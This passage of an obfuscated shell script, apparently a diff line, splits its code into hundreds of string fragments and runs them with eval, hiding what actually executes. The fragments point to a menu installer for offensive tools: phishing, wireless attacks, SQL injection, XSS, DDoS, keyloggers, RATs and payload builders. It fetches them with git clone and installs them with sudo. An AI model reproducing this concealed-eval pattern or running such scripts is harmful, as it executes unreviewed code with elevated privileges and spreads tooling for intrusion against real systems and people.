f';iz='trap';fDz='| | ';lBBz='g ..';Nkz='ack-';rNz=' tru';myz='h cr';HFz='mman';DEz='  |_';Pnz='e Fo';vez='(Aut';AQz='deve';Jqz='{6} ';Bwz='ng T';euz='pipe';hfz='s_Bo';nxz='it2 ';aWz=' 02 ';Koz='dFla';tez=' Vis';xoz='d de';Xmz='ce)\';aKz='tup.';uvz='t.sh';fwz='to-p';nez='per ';Txz='up_b';Akz='e (M';RJz='itor';ymz='XBru';vgz='FatR';VCz='slee';tpz='er'\''s';Kxz='ore.';CSz='rhaw';ovz='mB.g';Whz=' Kit';bkz='eboo';Rlz='ox(F';QZz='blue';TDz='__|_';Nwz='ots_';CUz='soci';jDz='| '\''_';aez='Dirb';opz='ile ';XLz='& IP';wkz='OSX\';mpz='3GB ';KIz='s://';Qjz='CVE ';tfz='t wo';HTz='lly!';iPz='racn';TBz='Sear';EBBz='am B';mHz='ks t';GBz='m01\';Efz=' Onl';FRz='e.py';GHz='olle';iTz='kunu';pfz='ning';Bz=' "$P';QLz='OPRe';mbz='pcap';iCz='ttp:';Erz=' in ';UZz='gz';xWz='cd G';YKz='tor';qOz='05/O';WZz='a -j';quz='is.p';Wfz='fy f';nfz='_Bot';Loz='re f';VGz='this';wWz='or';HZz='aste';RKz='ay/m';SNz='cove';Awz='orki';FLz='L() ';wMz='Info';rCz='= re';WTz='der';Fkz='DoS ';QEz='by \';mvz='u/Sm';Urz='epo ';KBBz='mes ';wpz='d(Av';fuz='nv';rXz='rame';QTz='= 15';juz='is f';aQz='onal';loz=' (Ro';UCz='...\';nyz='orma';Wvz='omb3';nuz='ygam';cgz='nsic';jFz=';94m';FHz='re c';lLz='sern';hNz='r fr';dwz='05/m';Pdz='k)\n';gez='Payl';iSz='xt';OYz=' rea';whz='acle';gUz='ally';SGz='0+ t';jJz='clon';dlz='d XS';xsz='cogn';ckz=' ddo';NEz='  \e';wz='bann';ZCz='n'\''t ';MLz='Litt';Jxz='ou m';tUz='lp';DKz='chmo';AGz='best';yRz='cd R';ebz=' pkg';hCz='p: h';kez=' (We';qTz='on r';pYz=' mak';eiz='on c';iDz=''\'' | ';caz='not ';DWz='at-Y';vQz='92m"';JDz=' {';grz='_run';Jaz=' wif';skz=' (RA';idz='ish\';iuz='py.p';LQz='help';jIz='pen_';oqz='/off';QRz='einf';yGz='3m"';yLz='dres';lxz='tup_';Ztz='2mGa';Aez='2mWe';jiz='st';AABz='ems ';hxz='RING';kPz=' wil';ggz='rens';Pz='TERM';btz='PySn';Hgz='st e';xtz='akeg';rMz=' API';eYz='sent';eoz='For ';OVz='= 24';Aiz='Splo';koz='ethu';AOz='get ';Xvz='Targ';oIz='heck';qGz='tool';doz='id, ';ZJz='nsur';Qnz='ck T';Qxz=' now';dOz='ue ]';dYz='d-es';Qdz='SayC';pOz='Hub ';sgz='d cr';Yxz='gene';Enz='m\n"';HSz='/bha';qUz='acco';TJz='Back';kLz='n (U';vjz='OS A';mDz=' '\''__';Inz=' has';vTz='Brea';Wuz='yBir';mBBz='3';RABz='owse';ZBBz='= 27';Ohz='Mob-';Emz='-Ses';Tkz='-DoS';sVz='Word';WXz='_att';wqz='thun';VTz='tFin';Fjz=' you';noz='ss E';roz='n an';PRz='phon';bpz='{2} ';Zwz='ria\';aCz='forg';mKz=' hap';svz=' req';apz='ired';XFz='elec';rgz='yloa';ufz='rk i';Hcz='L In';acz='loit';ndz='se\n';csz='cate';dIz='er_p';dEz='\e[1';ez='LINU';Djz='y !!';oVz='ener';eRz='ytho';Nyz=' Hid';kRz='ploi';lGz=' Fre';XEz='m |_';Ecz='ctio';Pqz='ownl';Ovz='SBom';LSz='cd r';jXz='pixi';fiz='x.py';UVz='aSta';NPz='mple';wwz='th-o';ihz='oit_';vuz='mess';cZz='ar';kUz='oon ';NRz='ment';BQz='l/IP';UYz='n.gi';Kcz='Sqlm';YZz='ot/B';jtz='ke\n';CIz='http';EMz='m7\e';Bvz='3r\n';QBBz='o Ma';Puz='ake ';xrz='2mID';Opz='k un';bHz='ll u';pqz='s.ec';kgz=' ext';EYz='ssh\';Voz='ndro';ilz='Frea';Kmz=' PNS';Ajz='up y';VUz=' sav';rRz='RED_';RPz='brew';OWz='t Pa';lpz='d 1.';Afz='isit';nz='op;e';Boz='Imag';piz='gYih';Diz='/thr';Zvz=''\'' us';yOz=' run';Jtz='me)\';Cdz='lPhi';Xhz='Hack';yvz='netw';iZz='flux';hABz='] Re';Snz='Inst';nOz='from';oBBz='\n▓▓';Xnz='teX\';WIz='onti';ROz='R to';eWz='th4m';LJz='Anon';Vfz='Visi';MKz='.';Toz='er(F';Agz='p 8';Ipz='te:\';AHz='Here';KZz='uepo';QVz='naSt';YTz='Shod';xUz='ay/s';aLz='ion)';rsz='appe';Zaz='ex/W';FWz='ot {';Joz='Clou';IDz='er()';aEz='r_ha';wCz='n';kABz='3m25';WOz=' cli';XBBz='= 25';Uxz='ot_p';FVz='/cik';fsz='G\n"';Yuz='cd F';pvz='mS-B';Ngz='st I';rcz='can\';crz='un_p';Epz='y.\n';cxz='oken';VOz='.. '\''';poz='on):';rvz='l -y';YSz='ojec';Orz='m Gr';ifz='t fr';fxz='SSIO';khz='k_L(';gGz='e an';Irz='guid';Bez='b At';edz='Jack';Jiz='on l';Ikz='UFOn';gABz='3m23';sPz='map';yVz='SMWY';fFz='=\n"';FYz=' air';BOz='-y';QMz='HAWK';Fcz='n_to';Ddz='Hidd';SHz='. If';BIz='up: ';nBz='php ';xGz='[0;9';Qqz='now?';moz='otle';yEz='nux_';hZz='ork/';ntz='is\n';xjz='aSYN';QUz='over';lBz='== 0';KUz='t cl';ISz='vsec';WWz='us/c';dBz='inpu';qjz='Gold';Yfz='isif';QYz='L4bs';LABz='3m18';Wpz='cust';nCz='o\n\';gDz=''\''_ \';VBz='ool\';bjz='_sea';tsz='dia ';mYz='wps';Frz='x!\n';Srz='/lin';LZz='t-0.';vhz='Tent';DQz='cd I';Bbz='sshp';owz='t go';Uoz='or A';DRz='g.ex';Gyz='ist ';hwz='ia';PCz=' & T';MRz='quir';jZz='ion.';siz='cd E';mtz='Tetr';pTz='t_ip';Nz='; th';sIz='_ope';Fbz='airc';uTz='= 18';shz='ix\n';Vlz='ER\n';Hdz='ginx';Jlz=' poe';Mjz='meta';bmz='ks_L';oBz='src/';Iwz='brow';mTz='r IP';WQz=' num';Ubz='-3-d';iFz='out\';JCz='t';ADz='rip.';dnz='tus\';BFz='d() ';xiz='enta';Rqz='(y/n';qBBz='▓▓▒▒';JUz='e gi';Zhz='-LOA';UIz='TER ';cUz='92m!';LGz='and ';epz='Bett';MQz='= 7 ';WUz='ed a';auz='t ru';tBBz='▓ Lo';Ofz='2mCh';Ryz='ls\n';WJz='load';bDz='(_)_';oZz=' 05 ';ooz='diti';mWz='Gene';iHz='005\';fEz='Ther';ipz='ecti';laz='ice/';Lfz='05/T';LBBz='Sect';KEz=' |__';vxz='r th';jqz=' -O ';Ntz='Emai';Jhz='enom';FNz='(Por';DFz='91m!';klz='ar\n';Ixz='lp y';ofz='Warn';wdz='web_';eABz='3m22';vPz='p.sh';dZz='//ww';Kiz='ibgl';jHz='Spec';cFz='m'\'' i';lCz='inux';FMz='eInF';tqz='er-t';lVz='2mWo';Lkz='DDos';AUz='iety';Xjz='ve_s';jxz='mit2';hSz='ts.t';pz='1'\'' 2';Jwz='Web ';Jmz='imul';LOz='litt';WPz='n fr';tKz='-pro';gBBz='ing(';gsz='Kawa';tJz='surf';cBz='t\n"';Qwz='odes';gCz='Grou';mlz='on\n';VVz='ts.g';byz='3m6\';qIz='$'\''(y';ptz='ySna';Gxz='ly. ';Tuz='rd f';nEz='repo';duz=' pyg';vWz='dGen';YXz='s_L(';ONz='ciet';Vnz='eek\';Pjz='id7/';pkz='inis';cdz='QR C';DXz='/Vir';nPz='perm';irz='nnin';cvz='get';tSz='ga.p';Ocz='DSSS';Dxz='p bo';Xgz='Ghos';QOz='ENTE';Zrz='/n) ';Jfz='ws_B';glz='er a';KDz=' ___';ciz='x';bvz='_tar';SQz='ga.g';elz='S Se';pEz='o Te';rWz='eadS';sUz='--he';dABz='] Po';Ywz='on-a';HPz='ling';KBz='w To';mnz='Keyd';kZz='luxi';AXz='in.p';tgz='eati';RSz='nspi';THz=' hav';SBBz='enu\';Mnz=' Ins';Pwz='ce_c';Tfz='per.';dqz='_ins';Zlz='-sea';puz='tetr';EGz='s. W';yBz='t ==';JOz='.txt';raz='shpa';knz='d Ha';GZz='aw/m';QCz='hank';OABz='] We';PZz='xfz ';Sz='elif';Fqz='nd 9';uwz='oogl';SYz='i-Pu';fz='X=tr';KPz='p 1.';nLz='reco';DUz='ety';PDz=' _  ';Jcz='ion ';bNz='F \n';IRz='-m p';axz='_tel';Uyz='cks\';kiz='cd g';BVz='/set';plz='XSSt';cz='true';gZz='xion';NBz='gori';Lnz=' dir';Ewz='atin';Ctz=' (Fi';Sgz='Keyl';UGz=' in\';rPz='cd D';gHz='irHa';Pfz='ecki';rDz='| (_';llz='XSSC';Tiz='/web';xvz='a_to';fPz='/Scr';dcz='sed ';ICz='abou';oRz='oit';fpz='er I';aZz='ot-0';QPz='$MAC';Iaz='ite.';sfz='l no';eDz='|  _';Xfz='05/V';niz='k fr';EFz=']\e[';bOz='UX" ';ydz='ck_t';Idz='2\n"';wLz='n (I';ZUz='pt/d';FBBz='ots ';Otz='l)\n';PFz=' -p ';nJz='thub';bKz='sh i';Anz='teFo';soz='y st';Kvz='b\n"';HEz='| ._';VFz='e[0m';WCz='p 0.';URz='= 8 ';bQz='mat ';XMz='rloc';Wjz='cve_';ENz='g3r ';ABz='tf "';LHz='. Th';nUz='mege';Dgz='-hel';rrz=' des';uBz='$inp';wnz=' {Dr';vlz='Suit';yKz='rmat';Gjz=' wit';xJz='| $i';dXz='ttac';EQz='PGeo';KGz='+ to';jVz='erat';LMz='Xero';hPz='ec/D';Mcz='NoSq';YQz='in i';Bjz=' man';wQz='cd P';kSz='ga f';wDz='|___';TKz='tor.';Hmz='acki';uLz='IPGe';ngz='urlR';Pbz='dk4';wbz='ure';ayz='rk\n';ZIz=' ...';Kbz='met ';gjz='neer';bhz='kToM';pSz='a';qyz='3m10';mmz='inOn';iBz='2 ||';Npz='Stoc';Haz='ster';aOz='$LIN';ZGz='er. ';hBz=' == ';hmz='aShe';Nhz='am\n';Ffz='y)\n';Syz='3m3\';Ltz='an (';Lxz='etup';jhz='fram';Mpz='ce (';XGz='ine ';emz='orce';DSz='k.ph';Xiz='ix f';Lwz='ser ';Kpz='oid ';qaz='-y s';Axz='plet';vyz='twor';qoz='er o';Rxz='?(N/';AEz='|_| ';Knz='ebru';HMz='ne N';xKz='info';DGz='Tool';YFz='t an';nmz='e So';fkz=' DDo';eqz='_per';BGz=' Lin';jcz='n - ';bLz='m3\e';Obz='4';iOz='-pip';fdz='ing)';HUz='/dis';Khz='llco';lABz='] XS';hlz='nd F';PXz='w-Me';ykz='rShe';CFz='2m[\';Ooz='eSpl';pZz='/wif';Vbz='ev l';afz='visi';Exz='t ma';xz='er';bsz='enti';Eiz='eat9';Nmz='anog';Wnz=' Bru';UTz='ecre';yoz='vice';Ypz='ecov';kWz='ordl';Hnz='ute\';yDz=', |_';Liz='ib2.';Ujz='iora';xFz='tion';vnz='Fish';oLz='n to';sLz='nmap';GJz='ls:\';waz='./fa';hqz='Star';mEz='ase ';agz='ll)\';jNz='rHas';Bdz='Shel';jlz='XSpe';OUz='ird/';qVz='s:\n';Faz='ifit';aiz='ct/c';Sxz='y) '\''';rJz='0w/k';gvz='t_ta';UXz='wire';Ykz='pyDD';qpz='down';sXz='work';TFz='[1;7';Zmz='efor';JBz=' Sho';Sqz=')"';iGz='ol t';sABz='eaut';qsz='al_m';hLz='m4\e';kkz='te_a';Vwz='es:\';NXz='MWYG';sRz='/Tuh';mABz='3m26';UPz='p 2';pLz='ol) ';Oyz='3m2\';Swz='s So';BBBz='3m32';jUz='Recc';ogz='oad_';CABz='] Se';KSz='onsp';Udz='targ';sJz='ali-';iEz=' err';WFz='2m S';gJz='o "';xdz='atta';dNz=' Cor';oez='(Tel';Raz='te2.';nGz=' sha';dyz='il V';Btz='user';Rkz='rom\';cwz='ria ';cIz=' ent';fSz='sher';pRz='-get';DJz='y Hi';hoz='nly)';ULz='Phon';dpz='{3} ';DOz=' ins';WSz='/she';Ayz='self';EZz='luep';Htz='y Us';Jrz='e yo';aIz='$'\''\e';oyz=' Gat';xNz='on g';oTz=': '\'' ';NUz='eeba';Soz='hunt';vvz='rt.s';iBBz='▒▒▒▒';ZOz='L';dhz='aSpl';JJz='m1\e';dkz='s-ha';njz='ogua';pUz='ccoo';sQz='mome';egz='ls_L';vcz='ng a';CBBz='3m33';KKz='tus';vGz=' Gro';Caz='/raw';GKz='./in';Blz='AT\n';Owz='sour';Nuz='m.py';OXz='-Sho';asz='auth';INz='r) \';vKz='o-so';SJz='m0\e';BBz='\n\e';ZVz='/cor';sHz='Also';Cmz='g-Ca';Dlz='via-';Ybz='dev ';Unz=' CMS';Xqz='rmit';NLz='leBr';IYz=' kis';COz='pip3';QJz='Mult';Igz='xplo';iwz='igle';ynz='Capt';Yiz='mixp';hMz='g \n';TZz='tar.';Mvz='noth';Jdz='I-Se';nKz='roxy';Yhz=' XSS';Kz='file';sGz=' my ';KYz=' mdk';Kaz=' "TE';ioz='\nKa';dWz='/G0u';Qgz='ell\';NKz='_L';mQz='proc';vFz='a co';NOz='r.py';Tgz='ogge';HBz='e[1;';oHz='3m@P';cCz='o Jo';bABz='ists';uBBz='ing';tFz='This';Kgz='Vegi';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz$z$dz$z$ez$fz$gz$z$hz$z$iz$jz$kz$lz$mz$nz$oz$pz$z$qz$rz$sz$tz$z$uz$vz$z$wz$xz$z$yz$ABz$BBz$CBz$DBz$z$yz$ABz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$z$yz$ABz$EBz$FBz$QBz$HBz$IBz$RBz$SBz$TBz$UBz$VBz$WBz$z$yz$ABz$EBz$FBz$XBz$HBz$IBz$YBz$ZBz$PBz$z$yz$ABz$EBz$FBz$aBz$HBz$IBz$bBz$cBz$z$dBz$eBz$z$Az$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$Nz$Oz$z$nBz$oBz$pBz$qBz$rBz$z$qz$rz$sBz$z$Sz$tBz$uBz$vBz$wBz$xBz$dBz$yBz$ACz$BCz$az$z$CCz$DCz$ECz$FCz$z$Sz$tBz$uBz$vBz$GCz$xBz$dBz$yBz$HCz$BCz$az$z$ICz$JCz$z$Sz$tBz$uBz$vBz$KCz$xBz$dBz$yBz$LCz$BCz$az$z$yz$ABz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$WBz$z$VCz$WCz$XCz$z$yz$ABz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$nCz$WBz$z$VCz$WCz$oCz$z$pCz$qCz$z$Sz$tBz$uBz$vBz$rCz$sCz$uBz$vBz$tCz$uCz$vCz$wCz$z$xCz$yCz$ADz$BDz$z$dz$z$CDz$DDz$EDz$FDz$GDz$z$hz$z$HDz$z$wz$IDz$JDz$z$yz$ABz$BBz$CBz$DBz$z$yz$ABz$KDz$LDz$MDz$MDz$NDz$MDz$MDz$MDz$NDz$ODz$PDz$MDz$MDz$MDz$MDz$MDz$QDz$HBz$RDz$WBz$z$yz$ABz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ODz$ZDz$aDz$bDz$UDz$cDz$YDz$ODz$dDz$QDz$HBz$RDz$WBz$z$yz$ABz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$aDz$ZDz$lDz$fDz$gDz$jDz$kDz$aDz$mDz$nDz$HBz$oDz$WBz$z$yz$ABz$pDz$qDz$fDz$rDz$fDz$fDz$fDz$sDz$ZDz$tDz$fDz$lDz$pDz$uDz$sDz$vDz$QDz$HBz$oDz$WBz$z$yz$ABz$wDz$TDz$pDz$xDz$yDz$AEz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$CEz$JEz$QDz$HBz$RDz$WBz$z$yz$ABz$MDz$MDz$MDz$KEz$LEz$MDz$MDz$MDz$MDz$MDz$ZDz$MEz$fDz$MDz$MDz$MDz$QDz$HBz$RDz$WBz$z$yz$ABz$MDz$MDz$MDz$MDz$NEz$CBz$OEz$PEz$QEz$HBz$REz$SEz$TEz$UEz$VEz$WEz$XEz$MEz$BEz$HBz$RDz$YEz$z$HDz$z$ZEz$aEz$bEz$cEz$z$yz$ABz$MCz$dEz$eEz$fEz$gEz$hEz$iEz$jEz$kEz$WEz$lEz$mEz$nEz$oEz$pEz$qEz$rEz$sEz$tEz$CBz$uEz$vEz$wEz$xEz$yEz$nEz$dEz$AFz$MCz$PBz$z$HDz$z$CDz$DDz$EDz$FDz$BFz$tz$z$yz$ABz$BBz$CBz$CFz$HBz$DFz$dEz$AFz$EFz$FFz$GFz$HFz$IFz$JFz$KFz$LFz$z$VCz$MFz$z$qz$rz$sBz$z$HDz$z$dBz$NFz$JDz$z$OFz$PFz$QFz$dEz$RFz$EBz$SFz$TFz$UFz$VFz$dEz$RFz$EFz$SFz$CBz$WFz$XFz$YFz$ZFz$aFz$bFz$FBz$cFz$gBz$z$HDz$z$ICz$dFz$tz$z$uz$vz$z$yz$ABz$MCz$dEz$AFz$PBz$z$yz$ABz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$fFz$z$yz$ABz$dEz$gFz$MDz$MDz$MDz$MDz$hFz$iFz$HBz$RDz$WBz$z$yz$ABz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$eFz$fFz$z$yz$ABz$LFz$z$yz$ABz$dEz$jFz$MDz$MDz$kFz$lFz$mFz$nFz$oFz$z$yz$ABz$dEz$AFz$MDz$MDz$pFz$qFz$qFz$qFz$qFz$rFz$z$yz$ABz$BBz$sFz$z$yz$ABz$tFz$uFz$vFz$wFz$xFz$yFz$AGz$BGz$CGz$RBz$SBz$DGz$EGz$FGz$GGz$PBz$z$yz$ABz$HGz$IGz$JGz$KGz$LBz$LGz$MGz$NGz$OGz$PGz$QGz$RGz$SGz$TGz$UGz$WBz$z$yz$ABz$VGz$WGz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$fGz$gGz$hGz$iGz$jGz$WBz$z$yz$ABz$kGz$lGz$mGz$nGz$oGz$pGz$qGz$rGz$sGz$tGz$uGz$vGz$wGz$WBz$z$yz$ABz$BBz$xGz$yGz$z$yz$ABz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$HHz$IHz$JHz$KHz$LHz$MHz$NHz$OHz$WBz$z$yz$ABz$qGz$PHz$QHz$RHz$vCz$NGz$TGz$SHz$THz$gGz$UHz$VHz$WHz$XHz$YHz$PBz$z$yz$ABz$qGz$ZHz$aHz$bHz$rGz$sGz$tGz$uGz$vGz$wGz$kEz$WEz$cHz$z$yz$ABz$LFz$z$yz$ABz$dHz$eHz$bFz$FBz$fHz$gHz$hHz$iHz$HBz$RDz$WBz$z$yz$ABz$jHz$kHz$lHz$mHz$nHz$CBz$oHz$pHz$qHz$CBz$rHz$PBz$z$yz$ABz$sHz$tHz$uHz$vHz$wHz$TGz$xHz$yHz$AIz$z$yz$ABz$LFz$z$yz$ABz$tGz$uGz$vGz$BIz$dEz$gFz$CIz$DIz$EIz$FIz$GIz$HIz$CBz$rHz$PBz$z$yz$ABz$IIz$JIz$dEz$gFz$CIz$KIz$LIz$MIz$NIz$OIz$PIz$QIz$dEz$AFz$LFz$z$yz$ABz$IIz$JIz$dEz$gFz$CIz$KIz$LIz$MIz$RIz$pHz$qHz$CBz$rHz$PBz$z$yz$ABz$MCz$dEz$AFz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$lFz$mFz$nFz$ZIz$PBz$z$OFz$PFz$aIz$CBz$bIz$cIz$dIz$eIz$z$uz$vz$z$wz$xz$z$qz$rz$sBz$z$HDz$z$fIz$gIz$hIz$iIz$jIz$qGz$cEz$z$yz$ABz$MCz$kIz$bGz$cGz$lIz$mIz$qGz$nIz$oIz$pIz$z$OFz$PFz$qIz$rIz$bFz$FBz$cFz$gBz$sIz$wCz$z$HDz$z$tIz$uIz$vIz$wIz$xIz$TGz$yIz$JDz$z$uz$vz$z$yz$ABz$BBz$CBz$AJz$BJz$CJz$DJz$EJz$FJz$GJz$WBz$z$VCz$WCz$HJz$z$yz$ABz$EBz$IJz$JJz$CBz$KJz$LJz$MJz$NJz$OJz$LFz$z$yz$ABz$EBz$IJz$PJz$CBz$KJz$QJz$RJz$oFz$z$yz$ABz$EBz$IJz$SJz$CBz$KJz$TJz$LFz$z$dBz$eBz$z$Az$fBz$gBz$hBz$UJz$Nz$Oz$z$yz$ABz$MCz$VJz$WJz$TCz$XJz$YJz$ZJz$aJz$bJz$cJz$dJz$AIz$z$VCz$MFz$z$yz$ABz$eJz$fJz$gJz$z$hJz$z$yz$ABz$LFz$z$VCz$WCz$oCz$z$iJz$jJz$kJz$lJz$mJz$nJz$oJz$pJz$qJz$rJz$sJz$tIz$tJz$uJz$z$fIz$gIz$hIz$iIz$jIz$qGz$z$Az$fBz$gBz$sIz$vJz$wJz$xJz$gBz$sIz$vJz$yJz$AKz$BKz$z$CKz$sJz$tIz$tJz$z$DKz$EKz$FKz$z$GKz$HKz$IKz$BDz$z$tIz$tJz$JKz$KKz$z$yz$ABz$MCz$dEz$AFz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$lFz$mFz$nFz$ZIz$PBz$z$OFz$PFz$aIz$CBz$bIz$cIz$dIz$eIz$z$LKz$MKz$z$tIz$uIz$vIz$wIz$xIz$TGz$NKz$z$dz$z$tIz$uIz$vIz$wIz$xIz$TGz$NKz$z$hz$z$Sz$tBz$uBz$vBz$OKz$BCz$az$z$yz$ABz$MCz$VJz$WJz$TCz$XJz$YJz$ZJz$aJz$bJz$cJz$dJz$AIz$z$VCz$MFz$z$yz$ABz$eJz$fJz$gJz$z$hJz$z$yz$ABz$LFz$z$VCz$WCz$oCz$z$iJz$jJz$kJz$lJz$mJz$nJz$oJz$PKz$QKz$RKz$SKz$TKz$UKz$z$fIz$gIz$hIz$iIz$jIz$qGz$z$Az$fBz$gBz$hBz$VKz$jBz$kBz$WKz$uCz$vCz$wCz$z$XKz$SKz$YKz$z$ZKz$aKz$bKz$cKz$dKz$z$eKz$RJz$fKz$gKz$z$yz$ABz$MCz$dEz$AFz$tFz$DHz$hKz$iKz$jKz$kKz$lKz$mKz$nKz$oKz$pKz$qKz$rKz$sKz$CIz$tKz$uKz$vKz$wKz$UCz$kEz$WEz$cHz$z$yz$ABz$MCz$dEz$AFz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$lFz$mFz$nFz$ZIz$PBz$z$OFz$PFz$aIz$CBz$bIz$cIz$dIz$eIz$z$LKz$MKz$z$tIz$uIz$vIz$wIz$xIz$TGz$NKz$z$dz$z$tIz$uIz$vIz$wIz$xIz$TGz$NKz$z$hz$z$Sz$tBz$uBz$vBz$KCz$BCz$az$z$CCz$DCz$ECz$FCz$z$dz$z$CDz$DDz$EDz$FDz$GDz$z$hz$z$HDz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$FLz$tz$z$uz$vz$z$yz$ABz$BBz$CBz$GLz$HLz$ILz$JLz$KLz$TCz$DGz$LLz$WBz$z$VCz$WCz$HJz$z$yz$ABz$EBz$IJz$JJz$CBz$KJz$MLz$NLz$OLz$PLz$PBz$z$yz$ABz$EBz$IJz$PJz$CBz$KJz$QLz$RLz$SLz$TLz$xFz$yFz$ULz$VLz$WLz$XLz$YLz$ZLz$aLz$oFz$z$yz$ABz$EBz$IJz$bLz$CBz$KJz$cLz$dLz$eLz$fLz$gLz$WBz$z$yz$ABz$EBz$IJz$hLz$CBz$KJz$iLz$jLz$kLz$lLz$mLz$nLz$oLz$pLz$LFz$z$yz$ABz$EBz$IJz$qLz$CBz$KJz$rLz$sLz$oFz$z$yz$ABz$EBz$IJz$tLz$CBz$KJz$uLz$vLz$ILz$wLz$xLz$yLz$AMz$BMz$GHz$CMz$DMz$PBz$z$yz$ABz$EBz$IJz$EMz$CBz$KJz$ULz$FMz$WLz$GMz$HMz$IMz$JMz$BMz$GHz$CMz$DMz$PBz$z$yz$ABz$EBz$IJz$KMz$CBz$KJz$LMz$MMz$NMz$WBz$z$yz$ABz$EBz$IJz$OMz$CBz$KJz$PMz$QMz$oFz$z$yz$ABz$EBz$IJz$RMz$HBz$IBz$SMz$TMz$UMz$oFz$z$yz$ABz$EBz$IJz$VMz$HBz$IBz$WMz$XMz$YMz$PBz$z$yz$ABz$EBz$IJz$ZMz$HBz$IBz$aMz$WLz$bMz$cMz$dMz$eMz$PBz$z$yz$ABz$EBz$IJz$fMz$HBz$IBz$SMz$gMz$hMz$PBz$z$yz$ABz$EBz$IJz$iMz$HBz$IBz$jMz$kMz$oFz$z$yz$ABz$EBz$IJz$lMz$HBz$IBz$mMz$nMz$oMz$pMz$qMz$rMz$DMz$PBz$z$yz$ABz$EBz$IJz$sMz$HBz$IBz$JBz$tMz$uMz$vMz$wMz$xMz$yMz$ANz$BNz$WBz$z$yz$ABz$EBz$IJz$CNz$HBz$IBz$DNz$ENz$FNz$GNz$HNz$INz$WBz$z$yz$ABz$EBz$IJz$JNz$HBz$IBz$KNz$LNz$PLz$PBz$z$yz$ABz$EBz$IJz$MNz$HBz$IBz$NNz$ONz$PNz$PBz$z$yz$ABz$EBz$IJz$QNz$HBz$IBz$RNz$SNz$PLz$PBz$z$yz$ABz$EBz$IJz$TNz$HBz$IBz$UNz$VNz$oFz$z$yz$ABz$EBz$IJz$WNz$HBz$IBz$XNz$YNz$oFz$z$yz$ABz$EBz$IJz$ZNz$HBz$IBz$aNz$bNz$PBz$z$yz$ABz$EBz$IJz$cNz$HBz$IBz$dNz$eNz$fNz$LFz$z$yz$ABz$EBz$IJz$aBz$HBz$IBz$gNz$YMz$PBz$z$dBz$eBz$z$Az$fBz$gBz$hBz$UJz$Nz$Oz$z$yz$ABz$MCz$VJz$WJz$TCz$MLz$NLz$OLz$hNz$bJz$cJz$dJz$AIz$z$VCz$MFz$z$yz$ABz$eJz$fJz$gJz$z$hJz$z$yz$ABz$LFz$z$VCz$WCz$oCz$z$iJz$jJz$kJz$lJz$mJz$nJz$oJz$iNz$jNz$kNz$lNz$mNz$nNz$KLz$uJz$z$fIz$gIz$hIz$iIz$jIz$qGz$z$Az$fBz$gBz$sIz$vJz$wJz$xJz$gBz$sIz$vJz$yJz$AKz$BKz$z$oNz$mNz$nNz$KLz$z$Az$pNz$qNz$Dz$rNz$sNz$vCz$wCz$z$tNz$uNz$vNz$wNz$xNz$yNz$AOz$BOz$z$COz$DOz$EOz$FOz$GOz$HOz$IOz$JOz$z$wNz$KOz$LOz$MOz$OLz$NOz$z$OFz$PFz$QFz$BBz$CBz$OOz$POz$QOz$ROz$SOz$TOz$mGz$WGz$XGz$YGz$UOz$VOz$WOz$XOz$YOz$z$LKz$MKz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$Sz$Tz$aOz$bOz$cOz$dOz$Nz$Oz$z$eOz$fOz$DOz$EOz$gOz$hOz$gOz$hOz$iOz$jOz$z$COz$DOz$EOz$FOz$GOz$HOz$IOz$JOz$z$wNz$KOz$LOz$MOz$OLz$NOz$z$OFz$PFz$QFz$BBz$CBz$OOz$POz$QOz$ROz$SOz$TOz$mGz$WGz$XGz$YGz$UOz$VOz$WOz$XOz$YOz$z$LKz$MKz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$dz$z$ZEz$aEz$bEz$z$LKz$MKz$z$kOz$lOz$mOz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$hz$z$dz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$hz$z$Sz$tBz$uBz$vBz$KCz$xBz$dBz$yBz$LCz$BCz$az$z$CCz$DCz$ECz$FCz$z$Sz$tBz$uBz$vBz$OKz$BCz$az$z$yz$ABz$MCz$VJz$WJz$TCz$QLz$RLz$nOz$oOz$pOz$UCz$WBz$z$VCz$MFz$z$yz$ABz$eJz$fJz$gJz$z$hJz$z$yz$ABz$LFz$z$VCz$WCz$oCz$z$iJz$jJz$kJz$lJz$mJz$nJz$oJz$iNz$jNz$kNz$qOz$rOz$sOz$tOz$z$fIz$gIz$hIz$iIz$jIz$qGz$z$Az$fBz$gBz$sIz$vJz$wJz$xJz$gBz$sIz$vJz$yJz$AKz$BKz$z$uOz$rOz$vOz$z$Az$pNz$qNz$Dz$rNz$sNz$vCz$wCz$z$tNz$uNz$vNz$iJz$wNz$wOz$AOz$BOz$z$COz$DOz$EOz$FOz$GOz$HOz$IOz$JOz$z$xOz$EKz$yOz$APz$BPz$CPz$DPz$z$xCz$yOz$EPz$z$OFz$PFz$QFz$BBz$CBz$OOz$POz$QOz$ROz$SOz$TOz$mGz$WGz$XGz$YGz$UOz$VOz$WOz$XOz$YOz$z$LKz$MKz$z$xKz$yKz$ALz$BLz$CLz$DLz$ELz$ZOz$z$Sz$Tz$aOz$bOz$cOz$dOz$Nz$Oz$z$eOz$fOz$DOz$EOz$gOz$hOz$gOz$hOz$iOz$FPz$jOz$z$COz$DOz$EOz$FOz$GOz$HOz$IOz$JOz$z$xOz$EKz$yOz$APz$BPz$CPz$DPz$z$xCz$yOz$